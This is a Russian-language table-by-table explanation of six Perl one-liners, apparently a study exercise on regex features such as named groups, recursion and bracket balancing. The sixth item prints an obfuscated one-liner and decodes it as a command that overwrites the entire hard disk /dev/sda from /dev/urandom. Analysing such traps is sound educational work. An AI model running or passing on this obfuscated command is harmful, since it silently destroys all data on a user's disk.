## 1. `perl -lne 'print if /((?<q>w)|a)(?(<q>)e|r)/'`

| что | что делает |
|-----|------------|
| ключ `l` | строки выводятся с символом `\n` |
| ключ `e` | указывает, что далее следует perl-выражение, которое необходимо исполнить |  
| ключ `n` | указывает, что строка обработки оборачивается в цикл и обрабатывается каждая строка файлов, указанных в командной строке. Содержимое файлов не выводится|
| конструкция `(?<имя>…)`| представляет собой именованные запоминающие скобки |
| констркуция `((?<q>w)\|a)` | если мы находим совпадение с `w`, мы его запоминаем, как группу с именем `q`, или ищем совпадение с `a` |
| конструкция `(?(условие) шаблон-для-совпадения \| шаблон-для-несовпадения)` | оператор «если-то-иначе» |
| конструкция `(?(<q>)e\|r)` | значит, что в случае совпадения с именованной группой `q`, ищется совпадение с `e`, иначе с `r` |
| итог | данная команда выводит строки, содержащие `we` или `ar` |

## 2. `perl -lpe '$p = qr/(\((?:[^()]++|(?-1))*+\))/; $_/=2 unless /x $p \+ y $p/x'`

| что | что делает |
|-----|------------|
| ключ `l` | строки выводятся с символом `\n` |
| ключ `p` | указывает, что строка обработки оборачивается в цикл и обрабатывается каждая строка файлов, указанных в командной строке. Обрабатываемые строки печатаются |
| ключ `e` | указывает, что далее следует perl-выражение, которое необходимо исполнить |  
| оператор `qr/` | оператор компиляции паттерна. Сам паттерн — в одной capture group |
| квантификатор `*+` | квантификатор, требующий 0 или более раз, при этом исключает перебор «сколько раз совпадет субпаттерн», т. е. попробует максимальное кол-во раз, которое применяется паттерн, а меньшее кол-во пробовать не станет. Это оптимизирует перебор |
| конструкция `((?:[^()]++\|(?-1))*+`| 0 или более раз повторяется шаблон, не содержащий 1 или более раз (с отсутствием перебора) скобки или (?-1), т. е. рекурсивно применить предыдущую объявленную capture group(по сути, все выражение). __Таким образом, выражение проверяет сбалансированность скобок в аргументе__|
| выражение `$_/=2 unless /x $p \+ y $p/x`| берется $_ и делится пополам, но только в случае , если $_не подходит под регулярку /x $p \+ y $p/x |
| модификатор `/x`|  модификатор, указывает, что необходимо игнорировать пробелы внутри регулярки |
| итог | регулярка ищет совпадения вида `xA+xB`, где `A` и `B` – строки со сбалансированными скобками (например x()+y()) |

## 3. `perl -lne 'continue if /[^a-z]/i;$v="aiueo";print if /^[^$v]?([$v][^$v])*[$v]?$/i'`

| что | что делает |
|-----|------------|
| ключ `l` | строки выводятся с символом `\n` |
| ключ `e` | указывает, что далее следует perl-выражение, которое необходимо исполнить |  
| ключ `n` | указывает, что строка обработки оборачивается в цикл и обрабатывается каждая строка файлов, указанных в командной строке. Содержимое файлов не выводится|
| конструкция `if /[^a-z]/i`| иводимая строка проверяется на наличие символов, не являющихся буквами. Если таких нет, то выполняется дальнейший код |
| выражение `print if` | выводит то, что ввели, если оно совпадает с регуляркой |
| конструкция `^[^$v]?([$v][^$v])*[$v]?$/i` | строка букв, в которой чередуются гласные и согласные (`/i` — говорит о том, что регистр игнорируется) |
| конструкция `[$v]` | гласная |
| конструкция `[^$v]` | согласная |
| итог | код читает строку, в случае, если она состоит только из букв, проверяет, чередуются ли в ней гласные с согласными. Если да — строка выводится |

## 4. `perl -lne '@c=();for(split""){if(y/([{/)]}/){push@c,$_;next}if(/[])}]/){@c=(1),last if($_ ne pop@c);next}}print"F" if@c'`

| что | что делает |
|-----|------------|
| ключ `l` | строки выводятся с символом `\n` |
| ключ `e` | указывает, что далее следует perl-выражение, которое необходимо исполнить |  
| ключ `n` | указывает, что строка обработки оборачивается в цикл и обрабатывается каждая строка файлов, указанных в командной строке. Содержимое файлов не выводится|
| выражение `@c=()`| объявляется пустой массив с именем `c` |
| выражение `for(split””)` | перебирает все ссимволы ввода |
| выражение `if(y/([{/)]}/)` | заменяет `(` на `)`, `[` на `]`, `{` на `}`. `If` выполнится, если символ соответствует `(`, `[` или `{` |
| выражения `push` `next` | cохраняется с помощью `push` первый символ в `@c` (аналог стека), выполнение идет дальше по циклу (`next` — переход к началу цикла, следующая итерации) |
| выражение `if(/[])}]`| второй `if` выполнится, если перебираемый символ `]`, `}` или `)` |
| выражение `@c=(1), last if($_ ne pop@c);next}}` | вынимается верхний элемент из `@c` и сравнивается с текущим. Если не совпало — выход из цикла (`last` – выйти из цикла при условии, что `$_ ne pop@c` – несовпадение рассматриваемого символа с элементом массива, имеющим максимальный индекс, элемент убирается из массива). Иначе — дальше по циклу |
| выражение `print"F" if@c` | eсли после завершения цикла в `@c` что-то осталось — выводится `F` |
| итог | программа определяет корректное расположение трех видов скобок во входной строке (например,`({})` или `[{}()([])]` - верно, `({)}` - не верно) |

## 5. `perl -lpe '/^[^][{}()]*(([({[])((?:[^][{}()]*+|(?1)))*(??{($0=$2)=~y|([{|)]}|;"\\$0"}))/||($_=$.)'`

| что | что делает |
|-----|------------|
| ключ `l` | строки выводятся с символом `\n` |
| ключ `p` | указывает, что строка обработки оборачивается в цикл и обрабатывается каждая строка файлов, указанных в командной строке. Обрабатываемые строки печатаются |
| ключ `e` | указывает, что далее следует perl-выражение, которое необходимо исполнить |  
| конструкция `(([({[])((?:[^][{}()]*+\|(?1)))*(??{($0=$2)=~y\|([{\|)]}\|;"\\$0"}))` | запоминающие скобки, под номером 1 |
| конструкция `([({[])` | запоминает, какая открывающая скобка была, хранится в `$2` |
| конструкция `((?^[^][{}()]*+\|(?1)))*` | совпадение с не-скобками или выражению, соответствующему группе под номером 1 |
| конструкция `$0=$2;` | запись в `$0` содержимго `$2` (переменная `$2` – хранит группу открывающей скобки). |
| конструкция `0=~y\|([{\|)]}\|;` | замена открывающей скобки на закрывающую |
| конструкция `“\\$0”`| регулярка из того, что получилось |
| итог | данный код проверяет, что в выражении сбалансированы скобки трех типов |

## 6. `perl '-es!!),-#(-.?{<>-8#=..#<-*}>;*7-86)!;y!#()-?{}!\x20/`\``-v;<!;s++$_+ee'`

| что | что делает |
|-----|------------|
| ключ `e` | указывает, что далее следует perl-выражение, которое необходимо исполнить |  
| ключ `s` | операция замены по регулярке |
| символ `!` | ограничительный символ. Таким образом, пустую строку заменяют на `),-#(-.?{<>-8#=..#< -*}>;*7-86)`. Т.к. аргумент не указан, код выполняется с переменной `$_` |
| ключ `y` | замена символов (на входе 2 набора символов `А` и `В`, заменяет в строке символ `А[0]` на `В[0]`, `А[1]` на `B[1]` и т. д.) |
| выражение `#()-?{}` | первый набор |
| выражение `\x20/`-v;` | второй набор |
| конструкция `)-?` | 'из первого набора' «все символы от `)` до `?` в ASCII-таблице по порядку | 
| конструкция ``\x20/`-v;`| 'второй набор' аналогично, но с `-v`, `\x20` – это пробел(код 32)|
| вся конструкция | происходит замена `#` на пробел, `(` на `/`, `)` на ` и т. д. __После замены получим ‘cd /dev;sudo tee sda<urandom’__ |
| конструкция `s++$_+ee` | `s` – замена, в качестве ограничителя `+`. Модификатор ее означает, что строку «на что заменить» нужно рассматривать как код, результат которого надо подставить в первую строку. Рассматривает правую часть как строку, когда выполняет результат |
| итог | в результате кода выполняется команда `cd /dev; sudo tee sda<urandom`. Копируется содержимое `/dev/urandom `в `/dev/sda`. `/dev/urandom` -устройство, генерирующее случайные байты. `/dev/sda` – жесткий диск целиком. |
